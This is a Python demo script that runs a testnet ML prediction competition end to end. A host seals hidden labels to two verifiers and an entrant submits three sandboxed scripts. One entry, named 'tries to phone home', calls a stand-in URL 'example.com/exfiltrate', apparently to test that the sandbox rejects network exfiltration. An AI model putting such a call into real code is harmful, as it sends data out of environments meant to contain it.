"""End-to-end verified competition on diana: a host with hidden labels, one entrant with three scripts.

Prerequisites: Competitions deployed (scripts/deploy_competitions.py), coordinator and both verifiers running
(scripts/run_local.sh). Spends a little testnet QOR and fUSD.
"""

from __future__ import annotations

import argparse
import json
import secrets
import time

from eth_utils import keccak
from strongchar_compete.predictions import canonical_bytes
from strongchar_core.encodings import label_commit
from strongchar_datasets import presets
from strongchar_datasets.canonical import from_csv
from strongchar_qore import keystore, seal
from strongchar_qore.deployment import abi
from strongchar_qore.market import Contracts, WindowManager
from strongchar_qore.seal import Kind, make_card
from strongchar_runtime.client import Coordinator
from strongchar_runtime.funding import ensure_fusd
from strongchar_runtime.recipients import recipient
from web3 import Web3

COLUMNS = presets.HEALTH_COLUMNS[:-1]
SCRIPTS = {
    "logistic regression": b"""
import pandas as pd
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
tr = pd.read_csv('/data/train.csv'); te = pd.read_csv('/data/test_features.csv')
X = tr.drop(columns=['diabetes_risk'])
m = make_pipeline(StandardScaler(), LogisticRegression(max_iter=500)).fit(X, tr['diabetes_risk'])
pd.Series(m.predict(te[X.columns]), name='prediction').to_csv('/out/predictions.csv', index=False)
""",
    "always predict 0": b"""
import pandas as pd
te = pd.read_csv('/data/test_features.csv')
pd.Series([0] * len(te), name='prediction').to_csv('/out/predictions.csv', index=False)
""",
    "tries to phone home": b"""
import urllib.request
urllib.request.urlopen('https://example.com/exfiltrate', timeout=5)
""",
}


def csv(x, y=None) -> bytes:
    head = ",".join(COLUMNS + (["diabetes_risk"] if y is not None else []))
    rows = [",".join(f"{v:g}" for v in r) + (f",{int(t)}" if y is not None else "") for r, t in
            zip(x, y if y is not None else [None] * len(x))]
    return (head + "\n" + "\n".join(rows) + "\n").encode()


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--coordinator", default="http://127.0.0.1:8700")
    ap.add_argument("--prize", type=int, default=5_000)
    ap.add_argument("--minutes", type=int, default=8, help="time until the submission deadline")
    a = ap.parse_args()
    c = Contracts()
    comp = c.evm.w3.eth.contract(address=Web3.to_checksum_address(c.dep.competitions), abi=abi("Competitions"))
    host_actor, ent_actor = keystore.load("host"), keystore.load("entrant")
    host, ent = host_actor.account, ent_actor.account
    hc, ec = Coordinator(a.coordinator, host), Coordinator(a.coordinator, ent)
    for actor, cl in ((host_actor, hc), (ent_actor, ec)):
        cl.put_card(make_card(actor.qor, actor.seal, actor.account.private_key, actor.account.pqc.secret_key))
    verifiers = [c.dep.verifier_a, c.dep.verifier_b]
    recips, keys = zip(*(recipient(c.chain, hc, v) for v in verifiers))
    cid = comp.functions.count().call() + 1

    data = from_csv(presets.health_csv(5_000, seed=7))  # a different draw from the training-job demo
    x, y = data.x, data.y
    train_id = hc.put_public(csv(x[:4_000], y[:4_000]), "train.csv")
    labels, salt = canonical_bytes([int(v) for v in y[4_000:]]), secrets.token_bytes(32)
    bundle = json.dumps({"features": csv(x[4_000:]).decode(), "labels": "0x" + labels.hex(), "salt": "0x" + salt.hex()})
    aad = seal.aad(comp.address, cid, 0, 0, Kind.TEST_FEATURES, list(keys))
    test_id = hc.put_blob(seal.seal(list(recips), bundle.encode(), Kind.TEST_FEATURES, aad), "test")
    meta = {"kind": "competition", "title": "Predict diabetes risk", "task": "classification", "metric": "accuracy",
            "classes": 2, "rows": 1_000, "train": train_id, "image": "strongchar-sandbox:1", "timeoutS": 300}
    meta_hash = hc.put_draft(meta, {"test": test_id})
    print(f"host sealed test features + labels to both verifiers; public train set {train_id[:18]}…")

    print("host funding:", ensure_fusd(c, host, a.prize))
    w = WindowManager(c.chain, host, (c.dep.fusd, comp.address))
    c.send(host, c.fusd.functions.approve(comp.address, a.prize), w)
    now = int(time.time())
    deadline, reveal = now + a.minutes * 60, now + a.minutes * 60 + 300
    r = c.send(host, comp.functions.create(bytes.fromhex(meta_hash[2:]), label_commit(labels, salt), a.prize,
                                           deadline, reveal, 3), w)
    assert comp.functions.count().call() == cid
    print(f"competition {cid} created, prize {a.prize / 1e6} fUSD, labels committed: {r.txhash}")

    we = WindowManager(c.chain, ent, (comp.address,))
    for name, script in SCRIPTS.items():
        env = seal.seal(list(recips), script, Kind.SCRIPT, seal.aad(comp.address, cid, 0, 0, Kind.SCRIPT, list(keys)))
        env_id = ec.put_blob(env, "script")
        r = c.send(ent, comp.functions.submit(cid, keccak(script), bytes.fromhex(env_id[2:])), we)
        print(f"entrant submitted '{name}' sealed to the verifiers: {r.txhash}")

    shown = set()
    while True:
        cs = comp.functions.getCompetition(cid).call()
        for i, e in enumerate(comp.functions.getEntries(cid).call()):
            if e[3] != 0 and i not in shown:
                shown.add(i)
                why = next((x.get("reason") for x in hc.attestations(f"comp-{cid}-validity-{i}")), "")
                print(f"entry {i} ({list(SCRIPTS)[i]}): {'valid' if e[3] == 1 else 'invalid'} {why}")
        if time.time() > deadline and cs[7] and not cs[8]:
            r = c.send(host, comp.functions.revealLabels(cid, labels, salt), w)
            print(f"scores posted with both ML-DSA-87 signatures; host revealed the labels: {r.txhash}")
        if cs[9]:
            break
        time.sleep(10)
    for i, e in enumerate(comp.functions.getEntries(cid).call()):
        if e[3] == 1:
            print(f"entry {i}: score {e[5] / 1e6:.4f}")
    print(f"settled; entrant can claim {comp.functions.claimable(ent.evm).call() / 1e6} fUSD")


if __name__ == "__main__":
    main()
